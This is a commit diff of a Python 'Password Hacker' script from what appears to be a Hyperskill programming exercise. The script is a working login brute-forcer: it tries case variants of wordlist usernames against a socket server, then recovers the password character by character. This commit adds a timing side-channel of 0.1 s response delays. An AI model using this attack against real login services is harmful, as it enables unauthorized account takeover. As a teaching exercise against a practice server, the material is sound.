c85188bf938a61a8c13ad87467b2a35badcb3a6b
TomasDolejsek <tdolejsek@centrum.cz>
2023-05-23 08:11:53 +0200

    Tomas Dolejsek

--- 022 Password Hacker (Hyperskill)/hack.py
+++ 022 Password Hacker (Hyperskill)/hack.py
@@ -1,8 +1,9 @@
 import argparse
 import socket
-import itertools
-import json
-import string
+from itertools import product
+from json import dumps, loads
+from string import ascii_letters, digits
+from time import perf_counter
 
 
 class Hacker:
@@ -11,36 +12,39 @@ class Hacker:
         parser.add_argument('ip_address')
         parser.add_argument('port', type=int)
         args = parser.parse_args()
-        self.my_socket = socket.socket()
-        self.my_socket.connect((args.ip_address, args.port))
+        self.address = (args.ip_address, args.port)
         self.start()
 
     def start(self):
-        login_dict = self.find_login('logins.txt')
-        chars = string.ascii_letters + string.digits
+        my_socket = socket.socket()
+        my_socket.connect(self.address)
+        login_dict = self.find_login('logins.txt', my_socket)
+        chars = ascii_letters + digits
         while True:
             for char in chars:
                 login_dict['password'] = login_dict['password'][:-1] + char
-                json_dict = json.dumps(login_dict)
-                self.my_socket.send(json_dict.encode())
-                response = json.loads(self.my_socket.recv(1024).decode())
+                json_dict = dumps(login_dict)
+                my_socket.send(json_dict.encode())
+                start = perf_counter()
+                response = loads(my_socket.recv(1024).decode())
+                end = perf_counter()
                 if response['result'] == 'Connection success!':
                     print(json_dict)
-                    self.my_socket.close()
+                    my_socket.close()
                     exit()
-                if response['result'] == 'Exception happened during login':
+                if end - start > 0.1:
                     login_dict['password'] += 'a'
                     break
 
-    def find_login(self, filename):
+    def find_login(self, filename, my_socket):
         login_dict = {"login": '', "password": ''}
         with open(filename, 'r') as file:
             for word in file:
                 for attempt in self.case_versions(word.strip()):
                     login_dict['login'] = attempt
-                    json_dict = json.dumps(login_dict)
-                    self.my_socket.send(json_dict.encode())
-                    response = json.loads(self.my_socket.recv(1024).decode())
+                    json_dict = dumps(login_dict)
+                    my_socket.send(json_dict.encode())
+                    response = loads(my_socket.recv(1024).decode())
                     if response['result'] == "Wrong password!":
                         file.close()
                         return login_dict
@@ -48,7 +52,7 @@ class Hacker:
     @staticmethod
     def case_versions(word):
         cases = [char.lower() + char.upper() for char in word]
-        for password in itertools.product(*cases):
+        for password in product(*cases):
             password = ''.join(str(x) for x in password)
             yield password
 
